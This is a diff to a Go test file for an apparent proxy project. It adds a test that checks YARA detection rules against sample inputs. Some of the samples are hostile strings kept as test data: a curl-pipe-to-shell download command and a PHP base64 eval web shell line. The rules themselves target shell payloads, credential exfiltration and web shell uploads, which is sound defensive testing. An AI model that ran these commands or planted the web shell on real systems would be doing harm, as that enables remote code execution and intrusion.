@@ -32,6 +32,7 @@ import (
 	"github.com/rom/xproxy/internal/mfa"
 	"github.com/rom/xproxy/internal/passwd"
 	"github.com/rom/xproxy/internal/waf"
+	"github.com/rom/xproxy/internal/yara"
 )
 
 var nolog = slog.New(slog.NewTextHandler(io.Discard, nil))
@@ -79,6 +80,7 @@ func TestYAMLDocuments(t *testing.T) {
 			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/openapi/orders.yaml", filepath.Join(dir, "filters", "orders-openapi.yaml")))
 			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/staff.htpasswd", usersFile(t)))
 			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/mfa", mfaFile(t)))
+			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/rules/stream.yar", filepath.Join(dir, "yara", "rules.yar")))
 			if strings.Contains(string(data), "\nversion: 1\n") || strings.HasPrefix(string(data), "version: 1\n") {
 				if _, err := config.ParseWith(data, false); err != nil {
 					t.Fatalf("complete document: %v", err)
@@ -101,6 +103,52 @@ routes:
 				t.Fatalf("fragment: %v", err)
 			}
 		})
+	}
+}
+
+// TestYARARules compiles the example rule set and checks that each
+// rule matches something it claims to and nothing it does not. A rule
+// file that compiles but matches nothing is the failure mode worth
+// catching.
+func TestYARARules(t *testing.T) {
+	rs, err := yara.LoadFile(filepath.Join(root(t), "yara", "rules.yar"))
+	if err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	cases := []struct {
+		rule  string
+		input string
+	}{
+		{"executable_header", "MZ\x90\x00\x03 padding PE\x00\x00 rest"},
+		{"executable_header", "\x7fELF\x02\x01\x01"},
+		{"archive_of_executables", "PK\x03\x04 invoice.EXE"},
+		{"shell_payload", "curl -s http://x | sh ; chmod +x /tmp/a"},
+		{"credential_exfiltration", "key=AKIAIOSFODNN7EXAMPLE"},
+		{"credential_exfiltration", "-----BEGIN OPENSSH PRIVATE KEY-----"},
+		{"internal_marker", "this file is XPROXY-INTERNAL-ONLY"},
+		{"webshell_upload", "<?php eval(base64_decode($_POST[0])); ?>"},
+		{"sqlite_database", "SQLite format 3\x00 rest of the header"},
+	}
+	for _, c := range cases {
+		found := false
+		for _, m := range rs.Scan([]byte(c.input)) {
+			if m.Rule == c.rule {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("%s did not match %q", c.rule, c.input)
+		}
+	}
+	// Ordinary traffic must not trip any of them.
+	for _, clean := range []string{
+		"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
+		"{\"order\": 42, \"customer\": \"acme\"}",
+		"a plain text document about curl and shells",
+	} {
+		if ms := rs.Scan([]byte(clean)); len(ms) != 0 {
+			t.Errorf("%q matched %v", clean, ms)
+		}
 	}
 }
 
